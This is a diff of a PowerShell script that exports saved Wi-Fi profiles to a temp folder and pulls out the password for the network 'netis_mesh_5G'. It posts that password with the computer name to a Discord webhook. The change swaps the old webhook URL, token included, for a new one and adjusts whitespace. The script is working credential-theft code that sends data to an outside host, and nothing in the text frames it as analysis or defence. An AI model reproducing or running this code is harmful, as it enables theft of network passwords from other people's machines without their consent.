@@ -1,5 +1,5 @@
 $target = "netis_mesh_5G"
-$hookUrl = "https://discordapp.com/api/webhooks/1465987971466395773/oYnAK6pdTATSbadnkw-2fraAguGL88gI9NIlKnXijZlkFMeiDmgtgq-VevctXFzQ4C9O"
+$hookUrl = "https://discord.com/api/webhooks/1498815878161236098/c5tRWHMWtTbujvKRdYRCgLuTByoBq_eUDHgUfwW0jyAnY0XHJ0q9nxa7C-eQdSlMPzww"
 $content = 
 $tempDir = Join-Path $env:TEMP ("wifi_profiles_" + [guid]::NewGuid())
 New-Item -ItemType Directory -Path $tempDir | Out-Null
@@ -31,7 +31,7 @@ try {
                 content = "# $env:COMPUTERNAME`n"+$password
             } | ConvertTo-Json
             Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
-            
+
             break
         }
     }
